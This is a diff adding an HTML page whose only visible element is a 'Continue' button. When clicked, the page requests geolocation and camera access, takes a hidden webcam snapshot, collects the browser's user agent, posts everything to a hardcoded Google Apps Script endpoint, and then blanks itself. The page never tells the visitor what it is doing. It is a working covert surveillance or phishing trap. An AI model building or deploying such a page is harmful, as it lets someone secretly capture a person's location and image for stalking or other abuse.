@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Capture Location + Photo</title>
+</head>
+<body>
+  <button id="startBtn">Continue</button>
+  <video id="video" autoplay playsinline style="display:none"></video>
+  <canvas id="canvas" style="display:none"></canvas>
+
+  <script>
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzjWa_OeRm3zxw8xaKKk5OYjgjZaSbrMb-cXn0gmjffplx8qb96XetR-8qe-k0v2iez/exec";
+
+    document.getElementById("startBtn").addEventListener("click", async () => {
+      let locationData = null;
+
+      // 1️⃣ Request location
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        locationData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
+      } catch (err) {
+        console.log("Location denied");
+      }
+
+      // 2️⃣ Request camera
+      let photoData = null;
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        await new Promise(resolve => setTimeout(resolve, 1500));
+
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        photoData = canvas.toDataURL("image/jpeg");
+
+        stream.getTracks().forEach(track => track.stop());
+      } catch (err) {
+        console.log("Camera denied or failed");
+      }
+
+      // 3️⃣ Send data
+      const payload = {
+        location: locationData,
+        device: navigator.userAgent,
+        photo: photoData
+      };
+
+      fetch(WEB_APP_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      document.body.innerHTML = ""; // make page blank
+    });
+  </script>
+</body>
+</html>
